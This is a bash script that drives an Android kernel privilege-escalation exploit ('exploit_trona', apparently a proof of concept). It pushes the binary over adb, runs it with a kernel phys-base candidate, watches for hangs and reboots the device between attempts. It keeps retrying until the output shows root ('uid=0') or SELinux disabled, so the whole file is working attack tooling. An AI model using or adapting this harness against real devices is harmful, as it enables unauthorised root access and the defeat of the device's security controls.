#!/bin/bash
# Grind the trona exploit across reboots, cycling kernel phys-base candidates.
# Includes a hang watchdog: if an attempt exceeds LIMIT seconds (exploit stuck
# in uninterruptible kernel D-state), force-reboot instead of waiting forever.
cd "$(dirname "$0")"
BIN=${1:-poc-28663/exploit_trona}
BASES=(0x40080000)
LIMIT=240
ATTEMPT=0
while true; do
	for BASE in "${BASES[@]}"; do
		ATTEMPT=$((ATTEMPT + 1))
		echo "===== grind attempt $ATTEMPT (base $BASE) $(date +%H:%M:%S) ====="
		adb wait-for-device
		sleep 15
		adb push "$BIN" /data/local/tmp/exploit_trona >/dev/null 2>&1
		adb shell "cd /data/local/tmp && timeout $LIMIT ./exploit_trona $BASE selfix" > "attempt_${ATTEMPT}_${BASE}.log" 2>&1 &
		ADBPID=$!
		START=$SECONDS
		HUNG=0
		while kill -0 $ADBPID 2>/dev/null; do
			sleep 5
			if [ $((SECONDS - START)) -gt $((LIMIT + 90)) ]; then
				echo "  [watchdog] attempt hung, force-rebooting"
				adb shell reboot >/dev/null 2>&1
				HUNG=1
				break
			fi
		done
		wait $ADBPID 2>/dev/null
		OUT=$(cat "attempt_${ATTEMPT}_${BASE}.log")
		echo "$OUT" | tail -40
		if echo "$OUT" | grep -qE "SELINUX OFF|uid=0|enforce 0"; then
			echo "===== WIN at attempt $ATTEMPT base $BASE ====="
			cp "attempt_${ATTEMPT}_${BASE}.log" "win_${ATTEMPT}_${BASE}.log"
			exit 0
		fi
		[ $HUNG -eq 0 ] && adb shell reboot >/dev/null 2>&1
		sleep 3
	done
done